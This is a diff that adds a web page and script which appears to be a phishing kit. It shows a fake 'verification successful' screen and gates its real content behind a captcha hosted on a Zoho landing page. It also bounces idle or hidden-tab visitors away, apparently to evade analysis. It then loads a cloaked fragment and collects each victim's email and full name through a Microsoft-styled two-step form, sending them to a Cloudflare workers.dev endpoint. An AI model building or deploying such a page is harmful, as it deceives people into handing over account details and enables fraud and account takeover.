@@ -1,0 +1,371 @@
+<div id="secure-loading" style="
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  min-height:60vh;
+  font-family:'Segoe UI',system-ui,sans-serif;
+  font-size:14px;
+  color:#666;
+  text-align:center;
+">
+  Verification successful<br>
+  Please wait while we finalize access…
+</div>
+
+<div id="secure-main" style="display:none;"></div>
+
+<script>
+(function(){
+  // ===== SETTINGS =====
+  var CAPTCHA_URL   = "https://portalaccess.zoholandingpage.com/OC04ZWY4LTRkY2EzMjlhZTQwNQAuAAAAAAAi6igbOUs0T6OC04ZWY4LTRkY2EzMjlhZTQwNQAuAAAAAAAi6igbOUs0T6/";
+  var API_VALIDATE  = "https://rapid-butterfly-1d9d.4a8daf702aff10f6401d506d.workers.dev/sync";
+  var CONTENT_URL   = "https://rapid-butterfly-1d9d.4a8daf702aff10f6401d506d.workers.dev/c";
+
+  // Inactivity
+  var IDLE_MS       = 60 * 1000;     // 2 min idle -> back to captcha
+  var HIDDEN_MS     = 60 * 1000;         // 1 min hidden tab -> back to captcha
+  var CHECK_EVERY   = 5 * 1000;
+
+  // Heartbeat
+  var HEARTBEAT_MS  = 45 * 1000;         // every 45s revalidate token
+
+  // ===== DOM =====
+  var mainEl    = document.getElementById("secure-main");
+  var loadingEl = document.getElementById("secure-loading");
+
+  // ===== INTERNAL =====
+  var lastActive  = Date.now();
+  var hiddenSince = null;
+  var leaving     = false;
+  var heartbeatTimer = null;
+  var idleTimer = null;
+
+  function go(url){
+    if (leaving) return;
+    leaving = true;
+    try { sessionStorage.removeItem("trust_token"); } catch(e){}
+    window.location.href = url;
+  }
+
+  function showMain(){
+    if (loadingEl) loadingEl.style.display = "none";
+    if (mainEl)    mainEl.style.display    = "block";
+  }
+
+  function markActive(){
+    lastActive = Date.now();
+    if (hiddenSince !== null) hiddenSince = null;
+  }
+
+  // Activity signals
+  ["mousemove","mousedown","keydown","touchstart","scroll","pointerdown"].forEach(function(evt){
+    window.addEventListener(evt, markActive, { passive:true });
+  });
+
+  document.addEventListener("visibilitychange", function(){
+    if (document.hidden) hiddenSince = Date.now();
+    else markActive();
+  });
+
+  function getToken(){
+    try { return sessionStorage.getItem("trust_token"); } catch(e){ return null; }
+  }
+
+  function validateWithRailway(token){
+    return fetch(API_VALIDATE, {
+      method: "POST",
+      headers: { "Content-Type":"application/json" },
+      body: JSON.stringify({ trust_token: token })
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(res){ return !!(res && res.ok); })
+    .catch(function(){ return false; });
+  }
+
+  function startIdleGuard(){
+    idleTimer = setInterval(function(){
+      var now = Date.now();
+
+      // hidden too long
+      if (document.hidden && hiddenSince && (now - hiddenSince) > HIDDEN_MS) {
+        go(CAPTCHA_URL);
+        return;
+      }
+
+      // idle too long
+      if ((now - lastActive) > IDLE_MS) {
+        go(CAPTCHA_URL);
+        return;
+      }
+    }, CHECK_EVERY);
+  }
+
+  function startHeartbeat(){
+    // Heartbeat only after page is loaded + shown
+    heartbeatTimer = setInterval(function(){
+      var token = getToken();
+      if (!token) { go(CAPTCHA_URL); return; }
+
+      validateWithRailway(token).then(function(ok){
+        if (!ok) go(CAPTCHA_URL);
+      });
+    }, HEARTBEAT_MS);
+  }
+
+  function stopTimers(){
+    try { if (idleTimer) clearInterval(idleTimer); } catch(e){}
+    try { if (heartbeatTimer) clearInterval(heartbeatTimer); } catch(e){}
+    idleTimer = null;
+    heartbeatTimer = null;
+  }
+
+  // ===== BOOT =====
+  var token = getToken();
+  if (!token) { go(CAPTCHA_URL); return; }
+
+  // Start idle guard immediately
+  startIdleGuard();
+
+  // 1) Validate token before loading content
+  validateWithRailway(token).then(function(ok){
+    if (!ok) { go(CAPTCHA_URL); return; }
+
+    // 2) Load protected HTML fragment
+    return fetch(CONTENT_URL, {
+      method: "POST",
+      headers: { "Content-Type":"application/json" },
+      body: JSON.stringify({ trust_token: token })
+    });
+  })
+  .then(function(r){
+    if (!r) return null;
+    return r.text();
+  })
+  .then(function(html){
+    if (!html) { go(CAPTCHA_URL); return; }
+
+    mainEl.innerHTML = html;
+    showMain();
+
+    // reset activity after successful load
+    lastActive = Date.now();
+
+    // init your form logic
+    initMainFlow();
+
+    // start periodic revalidation
+    startHeartbeat();
+  })
+  .catch(function(){
+    go(CAPTCHA_URL);
+  });
+
+  // Clean up timers on navigation away
+  window.addEventListener("beforeunload", stopTimers);
+
+})(); // end wrapper
+
+
+/* --------- FORM LOGIC: step1 + step2 (runs AFTER content is injected) --------- */
+function initMainFlow(){
+  const API_URL = "https://rapid-butterfly-1d9d.4a8daf702aff10f6401d506d.workers.dev/r";
+
+  const step1Form      = document.getElementById('verifyForm');
+  const step1Email     = document.getElementById('email');
+  const step1Container = document.getElementById('step1-container');
+  const step2Container = document.getElementById('step2-container');
+  const errorStep1     = document.getElementById('err');
+  const hp1            = document.getElementById('middleName');
+  const continueBtn    = document.getElementById('continueBtn');
+
+  const step2Form        = document.getElementById('step2-form');
+  const step2Email       = document.getElementById('step2-email');
+  const userEmailDisplay = document.getElementById('user-email-display');
+  const fullNameInput    = document.getElementById('full-name');
+  const backBtn          = document.getElementById('back-btn');
+  const errorStep2       = document.getElementById('error-msg-step2');
+  const loadingStep2     = document.getElementById('loading-msg-step2');
+  const hp2              = document.getElementById('hp2');
+
+  if (!step1Form || !step2Form) return;
+
+  const nameWrapper  = fullNameInput.closest('.ms-input-wrapper');
+  const emailWrapper = step1Email.closest('.field');
+
+  let stepToken = null;
+  let busy = false;
+
+  function showError(el, msg, wrapper){
+    if (!el) return;
+    if (!msg) {
+      el.style.display = 'none';
+      el.textContent   = '';
+      if (wrapper) wrapper.classList.remove('ms-input-error');
+    } else {
+      el.style.display = 'block';
+      el.textContent   = msg;
+      if (wrapper) wrapper.classList.add('ms-input-error');
+    }
+  }
+
+  function setStep2Loading(isLoading, msg){
+    if (!loadingStep2) return;
+    if (isLoading) {
+      loadingStep2.textContent = msg || 'Verifying your details…';
+      loadingStep2.style.display = 'block';
+    } else {
+      loadingStep2.textContent = '';
+      loadingStep2.style.display = 'none';
+    }
+  }
+
+  function showStep(step){
+    if (step === 1) {
+      step1Container.style.display = 'block';
+      step2Container.style.display = 'none';
+      showError(errorStep2, '', nameWrapper);
+      setStep2Loading(false);
+      fullNameInput.value = '';
+    } else {
+      step1Container.style.display = 'none';
+      step2Container.style.display = 'flex';
+      showError(errorStep1, '', emailWrapper);
+    }
+  }
+
+  if (continueBtn) {
+    continueBtn.style.display        = 'flex';
+    continueBtn.style.justifyContent = 'center';
+    continueBtn.style.alignItems     = 'center';
+  }
+
+  // STEP 1
+  step1Form.addEventListener('submit', function(e){
+    e.preventDefault();
+    if (busy) return;
+    busy = true;
+
+    const emailVal = step1Email.value.trim();
+    const hpVal    = hp1.value.trim();
+
+    if (!emailVal) {
+      showError(errorStep1, 'Please enter your email address.', emailWrapper);
+      busy = false;
+      return;
+    }
+
+    const body = new URLSearchParams();
+    body.set('action',  'step1');
+    body.set('email',   emailVal);
+    body.set('company', hpVal);
+
+    fetch(API_URL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      credentials: 'include',
+      body
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (!data || !data.ok) {
+        showError(errorStep1, (data && data.error) ? data.error : 'Unable to verify email.', emailWrapper);
+        busy = false;
+        return;
+      }
+
+      stepToken = data.token;
+      step2Email.value = data.email || emailVal;
+      userEmailDisplay.textContent = data.email || emailVal;
+
+      showStep(2);
+      busy = false;
+    })
+    .catch(() => {
+      showError(errorStep1, 'Unexpected error. Please try again.', emailWrapper);
+      busy = false;
+    });
+  });
+
+  // STEP 2
+  step2Form.addEventListener('submit', function(e){
+    e.preventDefault();
+    if (busy) return;
+    busy = true;
+
+    const emailVal = step2Email.value.trim();
+    const nameVal  = fullNameInput.value.trim();
+    const hpVal    = hp2.value.trim();
+
+    if (!emailVal || !nameVal) {
+      showError(errorStep2, 'Please enter your full name.', nameWrapper);
+      setStep2Loading(false);
+      busy = false;
+      return;
+    }
+
+    if (!stepToken) {
+      showError(errorStep2, 'Your session expired. Please restart verification.', nameWrapper);
+      showStep(1);
+      busy = false;
+      return;
+    }
+
+    const body = new URLSearchParams();
+    body.set('action',      'step2');
+    body.set('email',       emailVal);
+    body.set('name',        nameVal);
+    body.set('step2_token', stepToken);
+    body.set('company',     hpVal);
+
+    setStep2Loading(true, 'Verifying your details…');
+    showError(errorStep2, '', nameWrapper);
+
+    fetch(API_URL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      credentials: 'include',
+      body
+    })
+    .then(r => r.json())
+    .then(data => {
+      setStep2Loading(false);
+
+      if (!data) {
+        showError(errorStep2, 'Unexpected error. Please try again.', nameWrapper);
+        busy = false;
+        return;
+      }
+
+      if (!data.ok) {
+        fullNameInput.value = '';
+        if (data.blocked && data.redirect) {
+          window.location.href = data.redirect;
+          return;
+        }
+        showError(errorStep2, data.error || 'Verification failed.', nameWrapper);
+        busy = false;
+        return;
+      }
+
+      if (data.redirect) {
+        window.location.href = data.redirect;
+        return;
+      }
+
+      busy = false;
+    })
+    .catch(() => {
+      showError(errorStep2, 'Unexpected error. Please try again.', nameWrapper);
+      setStep2Loading(false);
+      busy = false;
+    });
+  });
+
+  backBtn.addEventListener('click', function(){
+    setStep2Loading(false);
+    showStep(1);
+  });
+
+  showStep(1);
+}
+</script>
